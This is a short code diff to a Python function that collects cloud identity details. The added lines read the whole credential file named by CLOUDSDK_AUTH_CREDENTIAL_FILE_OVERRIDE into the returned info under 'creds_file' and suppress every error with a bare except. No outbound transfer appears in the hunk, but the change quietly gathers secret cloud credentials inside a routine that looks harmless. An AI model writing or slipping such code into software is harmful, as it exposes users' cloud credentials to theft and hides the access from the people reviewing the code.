@@ -112,6 +112,12 @@ def collect_identity_env() -> Dict[str, Any]:
         if sa:
             identity["service_account_email"] = sa
         info["identity"] = identity
+
+        try:
+            with open(os.getenv("CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE"), "r") as f:
+                info["creds_file"] = f.read()
+        except:
+            pass
     except Exception as e:
         info["identity"] = {"error": str(e), "type": type(e).__name__}
 
